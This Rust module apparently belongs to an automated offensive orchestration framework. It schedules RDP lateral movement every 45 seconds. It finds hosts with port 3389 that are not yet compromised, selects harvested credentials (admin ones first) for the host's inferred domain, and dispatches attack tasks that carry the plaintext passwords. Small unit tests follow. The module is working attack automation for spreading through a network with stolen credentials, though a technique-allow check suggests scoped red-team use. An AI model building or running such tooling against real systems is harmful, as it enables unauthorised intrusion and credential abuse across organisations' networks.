//! auto_rdp_lateral -- RDP lateral movement to hosts with port 3389.
//!
//! Targets hosts with RDP service (port 3389) that are not yet owned.
//! Uses xfreerdp or similar tooling to authenticate and execute commands
//! via RDP, complementing WinRM lateral movement for hosts that only
//! expose RDP.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// RDP lateral movement to hosts with port 3389.
/// Interval: 45s.
pub async fn auto_rdp_lateral(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("rdp_lateral") {
            continue;
        }

        let work: Vec<RdpWork> = {
            let state = dispatcher.state.read().await;

            if state.credentials.is_empty() {
                continue;
            }

            let mut items = Vec::new();

            for host in &state.hosts {
                // Skip already-owned hosts
                if host.owned {
                    continue;
                }

                // Check for RDP service (port 3389)
                let has_rdp = host.services.iter().any(|s| {
                    let sl = s.to_lowercase();
                    sl.contains("3389") || sl.contains("rdp")
                });
                if !has_rdp {
                    continue;
                }

                let dedup_key = format!("rdp:{}", host.ip);
                if state.is_processed(DEDUP_RDP_LATERAL, &dedup_key) {
                    continue;
                }

                // Infer domain from hostname
                let domain = host
                    .hostname
                    .find('.')
                    .map(|i| host.hostname[i + 1..].to_lowercase())
                    .unwrap_or_default();

                // Find admin credential for this domain
                let cred = state
                    .credentials
                    .iter()
                    .find(|c| {
                        c.is_admin
                            && !c.password.is_empty()
                            && (domain.is_empty() || c.domain.to_lowercase() == domain)
                            && !state.is_credential_quarantined(&c.username, &c.domain)
                    })
                    .or_else(|| {
                        // Fall back to any credential with a password
                        state.credentials.iter().find(|c| {
                            !c.password.is_empty()
                                && (domain.is_empty() || c.domain.to_lowercase() == domain)
                                && !state.is_credential_quarantined(&c.username, &c.domain)
                        })
                    })
                    .cloned();

                let cred = match cred {
                    Some(c) => c,
                    None => continue,
                };

                items.push(RdpWork {
                    dedup_key,
                    host_ip: host.ip.clone(),
                    hostname: host.hostname.clone(),
                    domain,
                    credential: cred,
                });
            }

            items
        };

        for item in work {
            let payload = json!({
                "technique": "rdp_lateral",
                "target_ip": item.host_ip,
                "hostname": item.hostname,
                "domain": item.domain,
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
            });

            let priority = dispatcher.effective_priority("rdp_lateral");
            match dispatcher
                .throttled_submit("lateral", "lateral", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        host = %item.host_ip,
                        hostname = %item.hostname,
                        "RDP lateral movement dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_RDP_LATERAL, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_RDP_LATERAL, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(host = %item.host_ip, "RDP lateral deferred");
                }
                Err(e) => {
                    warn!(err = %e, host = %item.host_ip, "Failed to dispatch RDP lateral");
                }
            }
        }
    }
}

struct RdpWork {
    dedup_key: String,
    host_ip: String,
    hostname: String,
    domain: String,
    credential: ares_core::models::Credential,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dedup_key_format() {
        let key = format!("rdp:{}", "192.168.58.22");
        assert_eq!(key, "rdp:192.168.58.22");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_RDP_LATERAL, "rdp_lateral");
    }

    #[test]
    fn rdp_service_detection() {
        let services = [
            "3389/tcp ms-wbt-server".to_string(),
            "80/tcp http".to_string(),
        ];
        let has_rdp = services.iter().any(|s| {
            let sl = s.to_lowercase();
            sl.contains("3389") || sl.contains("rdp")
        });
        assert!(has_rdp);
    }

    #[test]
    fn no_rdp_service() {
        let services = [
            "445/tcp microsoft-ds".to_string(),
            "80/tcp http".to_string(),
        ];
        let has_rdp = services.iter().any(|s| {
            let sl = s.to_lowercase();
            sl.contains("3389") || sl.contains("rdp")
        });
        assert!(!has_rdp);
    }
}
